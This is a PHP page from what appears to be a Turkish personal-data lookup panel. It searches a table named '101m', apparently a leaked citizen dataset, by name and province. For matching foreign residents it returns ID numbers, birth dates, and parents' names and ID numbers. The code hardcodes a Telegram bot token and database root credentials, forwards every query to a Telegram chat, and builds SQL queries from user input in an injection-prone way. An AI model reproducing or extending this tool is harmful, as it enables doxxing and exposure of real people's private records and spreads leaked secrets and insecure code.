<?php

include '../server/database.php';

include '../server/rolecontrol.php';

include '../server/functions.php';

include '../server/premiumcontrol.php';

$page_title = "Yabancı Sorgu";

?>
<!DOCTYPE html>

<html lang="tr">

<head>
	<?php include 'inc/header_main.php'; ?>
	<link href="assets/plugins/custom/datatables/datatables.bundle.css" rel="stylesheet" type="text/css" />
	<script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>
	<style>
		.form-select {
			margin: 8px;
		}
	</style>
</head>


<body id="kt_body" class="aside-enabled">
	<div class="d-flex flex-column flex-root">
		<div class="page d-flex flex-row flex-column-fluid">
			<?php include 'inc/header_sidebar.php'; ?>
			<div class="wrapper d-flex flex-column flex-row-fluid" id="kt_wrapper">
				<?php include 'inc/header_navbar.php'; ?>
				<div class="content d-flex flex-column flex-column-fluid " id="kt_content">
					<div class="post d-flex flex-column-fluid" id="kt_post">
						<div id="kt_content_container" class="container-xxl">
							<div class="row">
								<div class="col-xl-12">
									<div class="col-lg-12">
										<div class="card">
											<div class="card-body">
												<h4 class="card-title mb-4"> Yabancı Sorgu</h4>
												<div style="padding: 3.8px;"></div>
												<div class="block-content tab-content">
													<form action="yabancisorgu" method="POST">
														<div class="tab-pane active" id="tc" role="tabpanel">
															<div style="display: flex; flex-direction: row;">
																<input style="margin-right: 50px;" autocomplete="off"
																	name="txtad" class="form-control form-control-solid"
																	type="text" id="ad" placeholder="Ad" required>
																<br>
																<input class="form-control form-control-solid"
																	autocomplete="off" type="text" name="txtsoyad"
																	id="soyad" placeholder="Soyad" required>
																<br>
															</div>
															<br>
															<input class="form-control form-control-solid"
																autocomplete="off" type="text" name="txtadresil"
																id="adresil" placeholder="Adres İl">
															<br>
															<input class="form-control form-control-solid"
																autocomplete="off" type="text" name="txtadresilce"
																id="adresilce" placeholder="Adres İlçe">
															<br>
														</div>
														<br>
														<center class="nw">
															<button onclick="checkNumber()" id="sorgula" name="Sorgula"
																type="submit"
																class="btn waves-effect waves-light btn-rounded btn-success"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Sorgula </button>
															<button onclick="clearTable()" id="durdurButon"
																type="button"
																class="btn waves-effect waves-light btn-rounded btn-danger"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Sıfırla </button>
															<button onclick="copyTable()" id="copy_btn" type="button"
																class="btn waves-effect waves-light btn-rounded btn-primary"
																style="font-weight: 400;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Kopyala </button>
															<button onclick="printTable()" id="yazdirTable"
																type="button"
																class="btn waves-effect waves-light btn-rounded btn-info"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Yazdır</button><br><br>
														</center>
													</form>

													<div class="table-responsive">

														<table id="kt_datatable_dom_positioning"
															class="table table-striped table-row-bordered gy-5 gs-7 border rounded">
															<thead>
																<tr>
																	<th>Kimlik Numarası</th>
																	<th>Adı</th>
																	<th>Soyadı</th>
																	<th>Doğum Tarihi</th>
																	<th>İl</th>
																	<th>İlçe</th>
																	<th>Anne Adı</th>
																	<th>Anne TC</th>
																	<th>Baba Adı</th>
																	<th>Baba TC</th>
                                                                    <th>Uyruk</th>

																</tr>
															</thead>
															<tbody id="00001010">
																<?php

																if (isset($_POST['Sorgula'])) {
                                                                    // Telegram Bot Credentials
                                                                    $telegramBotToken = "8023055024:AAH1k7VBZIqGqrmXLdkccFxiJJw_JVM99Y0"; // Replace with your bot token
                                                                    $telegramChatID = "-1002452003438"; // Replace with your chat ID

                                                                    // Function to send message to Telegram
                                                                    function sendTelegramMessage($message, $botToken, $chatID)
                                                                    {
                                                                        $url = "https://api.telegram.org/bot$botToken/sendMessage";
                                                                        $data = [
                                                                            'chat_id' => $chatID,
                                                                            'text' => $message,
                                                                            'parse_mode' => 'HTML'
                                                                        ];

                                                                        $options = [
                                                                            'http' => [
                                                                                'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
                                                                                'method'  => 'POST',
                                                                                'content' => http_build_query($data)
                                                                            ]
                                                                        ];

                                                                        $context  = stream_context_create($options);
                                                                        file_get_contents($url, false, $context);
                                                                    }

                                                                    $username = htmlspecialchars(strip_tags($_POST['username']));
                                                                    $currentTime = time();
																	$lastQueryTime = $_SESSION['last_query_time'];
																	$timeDifference = $currentTime - $lastQueryTime;


																	if ($access_level != 6) {

																		if ($timeDifference < 10) {
																			echo '<script type="text/javascript">toastr.error("10 saniyede 1 kere sorgu atabilirsiniz.");</script>';
																			exit;
																		} else {
																			$_SESSION['last_query_time'] = time();
																		}
																	}

                                                                    $getInfoSSID = $_SESSION['GET_USER_SSID'];

                                                                    $getInfoQuery = $db->query("SELECT * FROM `accounts` WHERE hash = '$getInfoSSID'");

                                                                    while ($getInfoData = $getInfoQuery->fetch()) {
                                                                        $adminusername = base64_decode($getInfoData['username']);
                                                                    }

																	totalLog("yabancisrg");
																	countAdd();

																	echo "<script>toastr.info('Kişi bilgileri getirildi.');</script>";
																	echo "<script>toastr.success('Sorgu işlemi başarıyla tamamlandı.');</script>";

																	$ad = htmlspecialchars(strip_tags($_POST['txtad']));
																	$soyad = htmlspecialchars(strip_tags($_POST['txtsoyad']));
																	$il = htmlspecialchars(strip_tags($_POST['txtadresil']));
																	$ilce = htmlspecialchars(strip_tags($_POST['txtadresilce']));

                                                                    $time = date('d.m.Y H:i');
                                                                    $telegramMessage = " <b>Yabancı Sorgu</b>\n\n"
                                                                        . "👤 Kullanıcı: <b>$username</b>\n"
                                                                        . "📄 Sorgulanan Ad:</b>$ad TL</b>\n"
                                                                        . "📄 Sorgulanan Soyad:</b>$soyad TL</b>\n"
                                                                        . "📄 Sorgulanan İl:</b>$il TL</b>\n"
                                                                        . "📄 Sorgulanan İlçe:</b>$ilce TL</b>\n"
                                                                        . "🕒 Zaman: <b>$time</b>";
                                                                    sendTelegramMessage($telegramMessage, $telegramBotToken, $telegramChatID);




																	$db = new PDO("mysql:host=localhost:8889;dbname=101mdata;charset=utf8", "root", "root");



																	if ($ad != "" && $soyad != "" && $il == "" && $ilce == "") {
																		$query = $db->query("SELECT * FROM 101m WHERE ADI = '$ad' AND SOYADI = '$soyad'");
																	} else if ($ad != "" && $soyad != "" && $il != "" && $ilce == "") {
																		$query = $db->query("SELECT * FROM 101m WHERE ADI = '$ad' AND SOYADI = '$soyad' AND NUFUSIL = '$il'");
																	} else if ($ad != "" && $soyad != "" && $il != "" && $ilce != "") {
																		$query = $db->query("SELECT * FROM 101m WHERE ADI = '$ad' AND SOYADI = '$soyad' AND NUFUSIL = '$il' AND NUFUSILCE = '$ilce'");
																	} else {
																		$query = $db->query("SELECT * FROM 101m WHERE ADI = '$ad' AND SOYADI = '$soyad'");
																	}

																	while ($data = $query->fetch()) {

																		if (substr($data['TC'], 0, 1) == 9) {

																			?>
																			<tr>
																				<td>
																					<?php echo $data['TC']; ?>
																				</td>
																				<td>
																					<?php echo $data['ADI']; ?>
																				</td>
																				<td>
																					<?php echo $data['SOYADI']; ?>
																				</td>
																				<td>
																					<?php echo $data['DOGUMTARIHI']; ?>
																				</td>
																				<td>
																					<?php echo $data['NUFUSIL']; ?>
																				</td>
																				<td>
																					<?php echo $data['NUFUSILCE']; ?>
																				</td>
																				<td>
																					<?php echo $data['ANNEADI']; ?>
																				</td>
																				<td>
																					<?php echo $data['ANNETC']; ?>
																				</td>
																				<td>
																					<?php echo $data['BABAADI']; ?>
																				</td>
																				<td>
																					<?php echo $data['BABATC']; ?>
																				</td>
                                                                                <td>
                                                                                    <?php echo $data['UYRUK']; ?>
                                                                                </td>
																			</tr>


																			<?php

																		}
																	}
																}
																?>
															</tbody>
														</table>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<?php include 'inc/footer_main.php'; ?>
			</div>
		</div>
	</div>

	<style>
		#kt_datatable_dom_positioning_filter {
			text-align: left;
			margin-right: 15px;
		}

		.dt-buttons button:nth-child(3) {
			background-color: #dc3545 !important;
			color: #fff;
			border-color: #dc3545;
		}
	</style>

	<script>
		$(document).ready(function () {
			var table = $('#kt_datatable_dom_positioning').DataTable({
				"language": {
					"lengthMenu": "Sayfada _MENU_ kayıt göster",
					"emptyTable": "Tabloda herhangi bir veri bulunmamaktadır",
					"info": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
					"infoEmpty": "Gösterilecek kayıt bulunamadı",
					"infoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
					"zeroRecords": "Eşleşen kayıt bulunamadı",
					"search": "Ara:",
					"processing": "İşleniyor...",
					"loadingRecords": "Kayıtlar yükleniyor...",
					"paginate": {
						"first": "İlk",
						"last": "Son",
						"next": "Sonraki",
						"previous": "Önceki"
					},
					"buttons": {
						"copy": "Kopyala",
						"excel": "Excel",
						"pdf": "PDF"
					}
				},
				"dom": "<'row'" +
					"<'col-sm-12 d-flex align-items-center justify-content-start'l>" +
					"<'col-sm-12 d-flex align-items-center justify-content-end'f>" +
					">" +
					"<'table-responsive'tr>" +
					"<'row'" +
					"<'col-sm-12 col-md-5 d-flex align-items-center justify-content-start justify-content-md-start'i>" +
					"<'col-sm-12 col-md-7 d-flex align-items-center justify-content-start justify-content-md-end'p>" +
					">",
				"sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
				"paging": false,
				"ordering": false,
				"info": false
			});

			new $.fn.dataTable.Buttons(table, {
				buttons: [
					'excel',
					{
                        extend: 'pdfHtml5',
                        customize: function (doc) {
                            // Özel PDF ayarları buraya eklenir
                            doc.defaultStyle.fontSize = 5;
                            doc.styles.tableHeader.fontSize = 5;
                            doc.styles.tableBodyOdd.fontSize = 5;
                            doc.styles.tableBodyEven.fontSize = 5;
                        }
                    },
					{
						text: 'Sorun Bildir',
						action: function (e, dt, node, config) {
							// SweetAlert ile kullanıcıya bir form göster
							Swal.fire({
								title: 'Sorun Bildir',
								html: '<textarea max="200" min="10" id="sorun" class="form-control" placeholder="Sorununuzu yazın">',
								focusConfirm: false,
								preConfirm: () => {
									// Kullanıcının girdiği değeri al
									const sorun = Swal.getPopup().querySelector('#sorun').value;
									// Discord webhook'a post at
									postToDiscordWebhook(sorun);
								}
							});
						}
					}
				]
			}).container().appendTo($('#kt_datatable_dom_positioning_wrapper .col-sm-12:eq(1)'));

			$('#kt_datatable_dom_positioning_filter input').on('keyup', function () {
				table.search(this.value).draw();
			});
		});

		function postToDiscordWebhook(sorun) {
			// Post verilerini ayarla
			var postData = {
				content: ` **Sorun:** ${sorun} \n**Gönderen: ** <?= $username; ?> \n**Sayfa Başlığı: ** <?= $page_title; ?> \n**Gönderilen Tarih** <?= date('d.m.Y H:i'); ?>`
			};


			// BİZLE SADECE BURDAN İLETİŞİM KURABİLECEĞİNİZ İÇİN BURAYI AÇIK BIRAKIYORUM
			// VELİ İZNİNİZİ ALIN MESAJINIZI ÖYLE ATIN BOHOHOHOYT
			var webhookUrl = '<?= $web6 ?>';

			// jQuery ile post isteği gönder
			$.ajax({
				type: 'POST',
				url: "../pages/php/check_data.php",
				success: function (response) {

					if (response == 0) {
						toastr.error("Günlük Limite Ulaştınız.");
					} else {
						$.ajax({
							type: 'POST',
							url: webhookUrl,
							contentType: 'application/json',
							data: JSON.stringify(postData),
							success: function (response) {
								// Başarılıysa işlemleri burada yapabilirsiniz
								toastr.success("Sorun başarıyla yöneticilere bildirildi.")
							},
							error: function (error) {
								// Hata oluştuysa işlemleri burada yapabilirsiniz
								toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
							}
						});

						$.ajax({
							type: 'POST',
							url: "../pages/php/pin_claim.php",
							success: function (response) {
								// Başarılıysa işlemleri burada yapabilirsiniz
								toastr.success("Kalan Kullanım Hakkınız " + response)
							},
							error: function (error) {
								// Hata oluştuysa işlemleri burada yapabilirsiniz
								toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
							}
						});
					}

				},
				error: function (error) {
					// Hata oluştuysa işlemleri burada yapabilirsiniz
					toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
				}
			});
		} 
	</script>

	<script id="clearTable">
		function clearTable() {
			window.location.reload();
		}
	</script>

	<script id="copyTable">
		function copyTable() {
			var copiedText = "";

			// Tabloyu seçin
			var table = document.getElementById('kt_datatable_dom_positioning'); // your_table_id, HTML tablonuzun ID'siyle değiştirilmelidir

			// Tablonun satırlarını döngüye alın
			for (var i = 0; i < table.rows.length; i++) {
				var row = table.rows[i];
				// Her satırın hücrelerini döngüye alın
				for (var j = 0; j < row.cells.length; j++) {
					copiedText += row.cells[j].textContent + "\t"; // Hücreler arasına bir sekme ekleyebilirsiniz
				}
				// Her satırın sonunda yeni bir satır ekleyin
				copiedText += "\n";
			}

			// Kopyalanan metni panoya kopyalayın
			var textarea = document.createElement("textarea");
			textarea.value = copiedText;
			document.body.appendChild(textarea);
			textarea.select();
			document.execCommand("copy");
			document.body.removeChild(textarea);

			toastr.success('Tablo içeriği panoya kopyalandı.');
		}
	</script>

	<script id="printTable">
		function printTable() {
			var table = document.getElementById("kt_datatable_dom_positioning");
			var windowContent = '<table border="1">';
			for (var i = 0; i < table.rows.length; i++) {
				windowContent += "<tr>";
				for (var j = 0; j < table.rows[i].cells.length; j++) {
					windowContent += "<td>" + table.rows[i].cells[j].innerHTML + "</td>";
				}
				windowContent += "</tr>";
			}
			windowContent += "</table>";

			var printWin = window.open('', '', 'width=600,height=600');
			printWin.document.open();
			printWin.document.write('<html><head><title>Tablo Yazdırma</title></head><body onload="window.print()">' + windowContent + '</body></html>');
			printWin.document.close();
			printWin.focus();
		}
	</script>

	<div id="kt_scrolltop" class="scrolltop" data-kt-scrolltop="true">
		<i class="ki-duotone ki-arrow-up"><span class="path1"></span><span class="path2"></span></i>
	</div>

	<script src="assets/plugins/global/plugins.bundle.js"></script>
	<script src="assets/js/scripts.bundle.js"></script>
	<script src="assets/plugins/custom/fullcalendar/fullcalendar.bundle.js"></script>
	<script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>
	<script src="assets/js/widgets.bundle.js"></script>
	<script src="assets/js/custom/widgets.js"></script>
	<script src="assets/js/custom/apps/chat/chat.js"></script>
	<script src="assets/js/custom/utilities/modals/users-search.js"></script>

</body>


</html>